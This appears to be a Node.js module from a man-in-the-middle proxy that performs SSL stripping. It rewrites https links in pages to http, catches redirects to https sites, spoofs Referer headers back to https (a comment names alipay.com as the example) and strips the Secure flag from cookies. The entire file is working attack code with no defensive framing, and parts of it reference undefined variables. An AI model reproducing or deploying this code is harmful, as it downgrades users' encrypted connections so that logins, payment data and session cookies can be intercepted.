var util = require('./util.js'),
	htmlcodec = require('./htmlcodec');



var https_url = {};


function addHttpsUrl(url) {
	url = urlEndWithSlash(url);
	https_url[url] = true;
}


function urlEndWithSlash(url) {
	if (url.indexOf('/') == -1) {
		url += '/';
	}
	return url;
}


var rHttpsUrl = /https:\/\/([\w\-./?%&=+,]{4,})/ig;


function htmlInjectHandler(html) {
	//
	// 替换页面中的https链接为http，并做记录
	//
	return html.replace(rHttpsUrl, function(str, url) {
		addHttpsUrl(url);
		return 'http://' + url;
	});
}


exports.checkRedir = function(res) {
	//
	// 检测是否重定向到https站点
	//
	if (res.statusCode == 302) {
		var url = res.headers['location'] || '';

		if (/^https:\/\//i.test(url)) {

			// https://$path
			var path = url.substr(8);
			addHttpsUrl(path);

			// https://$host/xxx
			var p = path.indexOf('/');
			res.headers['host'] = path.substring(0, p);
			res.url = path.substr(p);

			//
			// 返回给用户重定向后的https页面内容
			//   重复利用这个request，再请求一次
			//
//			proxyRequest(res, clientRes);

			util.warn('[WEB]', url, 'GOTO'.red, url);
			return false;
		}
	}
	return true;
};


exports.checkReq = function(req) {
	var hrd = req.headers;
	var fromHttpsPage;

/*

	//
	// 目标url在https列表中，
	//    则用https代理访问。
	// 如果资源的引用页在https列表中，
	//    则有可能是引用页中的相对路径（相对路径没法分析是https还是http的），
	//    也使用用https代理该资源（一般https页面的资源基本都是https的）。
	//
	var secure = https_url[url] || fromHttpsPage;

	//
	// 替换origin字段
	//
	var origin = reqHeader['origin'];
	if (origin) {
		if (secure) {
			reqHeader['origin'] = origin.replace('http:', 'https:');
		}
	}
*/

	//
	// [referer] http://www.alipay.com  (in MITM everything is http)
	//  =>       https://www.alipay.com (cheat)
	//
	var referer = hrd['referer'];
	if (referer) {
        var refUrl = referer.split('//')[1];
        if (refUrl) {
            refUrl = urlEndWithSlash(refUrl);

            fromHttpsPage = https_url[refUrl];
            if (fromHttpsPage) {
                hrd['referer'] = 'https://' + refUrl;
            }
        }
	}
};


exports.checkRes = function() {
	//
	// 过滤cookie的Secure标记
	//
	var cookies = resHeader['set-cookie'] || [];

	for(var i = cookies.length - 1; i >= 0; i--) {
		var pos = cookies[i].indexOf('; Secure');
		if (pos != -1) {
			cookies[i] = cookies[i].substr(0, pos);
		}
	}
};


exports.init = function() {
	htmlcodec.addListener(htmlInjectHandler);
	return true;
};
